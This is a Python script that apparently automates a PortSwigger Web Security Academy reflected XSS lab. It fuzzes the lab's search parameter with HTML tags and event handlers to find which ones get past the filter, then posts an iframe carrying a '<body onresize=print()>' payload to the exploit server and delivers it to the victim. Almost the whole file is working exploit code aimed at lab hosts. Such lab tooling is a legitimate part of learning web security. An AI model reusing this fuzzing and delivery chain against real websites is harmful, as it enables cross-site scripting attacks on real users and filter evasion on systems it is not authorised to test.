#!/usr/bin/env python3
from requests import get, post, ConnectTimeout
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.progress import track
from rich.align import Align
from rich.table import Table
from rich.style import Style
from time import sleep
from typing import Optional
import typer
import os

class InvalidURLException(Exception):
    """Exception raised when the response of the request is very likely to indicate an invalid url

    Attributes:
        message -- explanation of the error
    """
    def __init__(self, message='Given url is invalid') -> None:
        self.message = message
        super().__init__(self.message)
    
    def __str__(self) -> str:
        return super().__str__()

CONSOLE = Console()
LAYOUT = Layout()
TABLES_LAYOUT = Layout()
TABLE_TAGS = Table()
TABLE_EVENTS = Table()

DANGER_STYLE = Style(color='red', blink=True, bgcolor='white')

# Maximum number of connection retry
MAX_REP = 5

SUCCESS_STATUS_CODE = -1
REPEAT_STATUS_CODE = 1
ERROR_STATUS_CODE = 69420

TABLES_LAYOUT.split_row(Layout(name='table_tags', renderable=Align(renderable=TABLE_TAGS, align='center')), Layout(
    name='table_events', renderable=Align(renderable=TABLE_EVENTS, align='center')),)
TABLE_TAGS.add_column('Tags', justify='center', style='cyan', overflow='fold')
TABLE_EVENTS.add_column('Events', justify='center',
                        style='green', overflow='fold')

# text_search = Text('Now testing\ntag: [red]body[/red]\nevent: [red]onload[/red]')
LAYOUT.split_column(Layout(name='top_panel', renderable=Panel(title='Status', renderable=Align(
    'Now testing\ntag: [red]body[/red]\nevent: [red]onload[/red]', align='center', vertical='middle'))), Layout(name='bottom_panel', renderable=Panel(title='Tags and Event permitted', renderable=TABLES_LAYOUT)))

# Template lab
TEMPLATE_SERVER = 'https://ID_LAB.web-security-academy.net'
SERVER = ''

# Template exploit server
TEMPLATE_EXPLOIT = 'https://exploit-ID_EXPLOIT.exploit-server.net'
EXPLOIT = ''

# vulnerable_endpoint = ''
# Tags and events provided by https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
TAGS, EVENTS = [], []
TAGS_EVENTS_PERMITTED = []


def set_ips(lab_id: Optional[str] = None, exploit_id: Optional[str] = None):
    global SERVER, EXPLOIT
    if lab_id is not None and exploit_id is not None:
        SERVER = lab_id
        EXPLOIT = exploit_id
    else:
        CONSOLE.clear()
        SERVER = CONSOLE.input('Insert the lab\'s id\n').strip()
        CONSOLE.clear()
        EXPLOIT = CONSOLE.input(
            'Insert the id of the exploit server (Only the id!)\n').strip()
    # Can ids be validated?
    CONSOLE.clear()
    CONSOLE.print(LAYOUT)

    SERVER = TEMPLATE_SERVER.replace('ID_LAB', SERVER)
    EXPLOIT = TEMPLATE_EXPLOIT.replace('ID_EXPLOIT', EXPLOIT)


def setup():
    os.chdir(__file__.removesuffix(os.path.basename(__file__)))
    LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
        '[cyan]Retriving [green]tags\'[/green] set[/cyan]', align='center', vertical='middle')))
    CONSOLE.clear()
    CONSOLE.print(LAYOUT)
    # Retriving all the available tags
    with open('../res/tags.txt') as t:
        for tag in t:
            TAGS.append(tag.strip())
    LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
        '[cyan]Retrived [green]tags\'[/green] set[/cyan]', align='center', vertical='middle')))
    CONSOLE.clear()
    CONSOLE.print(LAYOUT)
    sleep(1)
    LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
        '[cyan]Retriving [green]events\'[/green] set[/cyan]', align='center', vertical='middle')))
    CONSOLE.clear()
    CONSOLE.print(LAYOUT)
    # Retriving all the available events
    with open('../res/events.txt') as e:
        for event in e:
            EVENTS.append(event.strip())
    LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
        '[cyan]Retrived [green]events\'[/green] set[/cyan]', align='center', vertical='middle')))
    CONSOLE.clear()
    CONSOLE.print(LAYOUT)
    sleep(1)


def analyze_tags_events():
    try:
        with Live(LAYOUT, refresh_per_second=0.4):
            tags_permitted = []
            for t in TAGS:
                LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
                    f'Now testing\n[red]{t}[/red]', align='center', vertical='middle')))
                payload = f'<{t}>'
                res = get(SERVER, {'search': payload}, timeout=10)
                if res.status_code == 504 or res.status_code == 403:
                    raise InvalidURLException()
                if res.status_code == 200:
                    tags_permitted.append(t)
                    LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
                        f'Now testing\n[green]{t}[/green]', align='center', vertical='middle')))
                    sleep(1)
                    # Add progress update
                    TABLE_TAGS.add_row(f'{t}')

            for t in tags_permitted:
                for e in EVENTS:
                    LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
                        f'Now testing\n[red]Tag: {t}\n Event: {e}[/red]', align='center', vertical='middle')))
                    payload = f'<{t} {e}=1>'
                    res = get(SERVER, {'search': payload}, timeout=10)
                    if res.status_code == 200:
                        TAGS_EVENTS_PERMITTED.append((t, e))
                        LAYOUT['top_panel'].split(Panel(title='Status', renderable=Align(
                            f'Now testing\n[green]Tag: {t}\n Event: {e}[/green]', align='center', vertical='middle')))
                        sleep(1)
                        # Add progress update
                        if tags_permitted[0] == t:
                            TABLE_EVENTS.add_row(f'{e}')
            return SUCCESS_STATUS_CODE
    except ConnectTimeout:
        if REPEAT_COUNT > MAX_REP:
            CONSOLE.clear()
            CONSOLE.print(
                'Connection timeout, max repetitions reached. Please, try again.\nDo you have issue with your internet connection?', style=DANGER_STYLE)
            return ERROR_STATUS_CODE
        CONSOLE.clear()
        CONSOLE.print(
            f'Connection timeout, retrying - attempt n°{REPEAT_COUNT+1}', style=DANGER_STYLE)
        sleep(3)
        for step in track(range(3)):
            sleep(1)
            step
        return REPEAT_STATUS_CODE
    except Exception:
        CONSOLE.clear()
        CONSOLE.print(
            'There was an error with the requests to the server site.\nBe sure to have inserted correctly only the lab id and the exploit server id!\nCheck also your internet connection and, please, try again.', style=DANGER_STYLE)
        return ERROR_STATUS_CODE


def print_results():
    print('Those are the permitted tags and events:\n')
    print(TAGS_EVENTS_PERMITTED)


def ask_to_complete_challenge():
    CONSOLE.clear()
    a = CONSOLE.input('Do you want to complete the challenge? (Y/N)\n')
    accept = ['yes', 'y']
    if a.lower() in accept:
        return True
    return False


def send_to_exploit():
    try:
        template_iframe = f"""
		<iframe src='{SERVER}/?search=%3Cbody+onresize%3Dprint%28%29%3E' onload="this.style.width='100%'" width="50%" height="50%"></iframe>
		"""
        res = post(EXPLOIT, {'urlIsHttps': 'on', 'responseFile': '/exploit',
                             'responseHead': 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8', 'responseBody': template_iframe, 'formAction': 'STORE'})

        if res.status_code != 200:
            CONSOLE.print(
                'Something went wrong when delivering the payload on the exploit server')
            return ERROR_STATUS_CODE

        res = get(f'{EXPLOIT}/deliver-to-victim')

        if res.status_code != 200:
            CONSOLE.print(
                'Something went wrong when delivering the exploit to the victim')
            return ERROR_STATUS_CODE

        CONSOLE.print('Everything was delivered. Challenge complete!')
        return SUCCESS_STATUS_CODE
    except ConnectTimeout:
        if REPEAT_COUNT > MAX_REP:
            CONSOLE.clear()
            CONSOLE.print(
                'Connection timeout, max repetitions reached. Please, try again.\nDo you have a slow internet connection?', style=DANGER_STYLE)
            return ERROR_STATUS_CODE
        CONSOLE.clear()
        CONSOLE.print(
            f'Connection timeout, retrying - attempt n°{REPEAT_COUNT+1}', style=DANGER_STYLE)
        sleep(3)
        for step in track(range(3)):
            sleep(1)
            step
        return REPEAT_STATUS_CODE
    except Exception:
        CONSOLE.clear()
        CONSOLE.print(
            'There was an error in the comunication with the exploit server. Check your internet connection and, please, try again.', style=DANGER_STYLE)
        return ERROR_STATUS_CODE


def main(lab_id: Optional[str] = typer.Argument(None), exploit_id: Optional[str] = typer.Argument(None)):
    try:
        setup()
        set_ips(lab_id, exploit_id)
        global REPEAT_COUNT
        REPEAT_COUNT = 0
        code = 0
        while (code != SUCCESS_STATUS_CODE) is not False and (REPEAT_COUNT <= MAX_REP):
            code = analyze_tags_events()
            if code == ERROR_STATUS_CODE:
                exit(-1)
            REPEAT_COUNT += 1
        print_results()
        # if not ask_to_complete_challenge():
        #     exit(0)
        REPEAT_COUNT = 0
        code = 0
        while (code != SUCCESS_STATUS_CODE) is not False and (REPEAT_COUNT <= MAX_REP):
            code = send_to_exploit()
            if code == ERROR_STATUS_CODE:
                exit(-1)
            REPEAT_COUNT += 1
    except Exception:
        CONSOLE.clear()
        CONSOLE.print(
            'An unexpected error occurred. Please, try again.', style=DANGER_STYLE)


if __name__ == '__main__':
    typer.run(main)
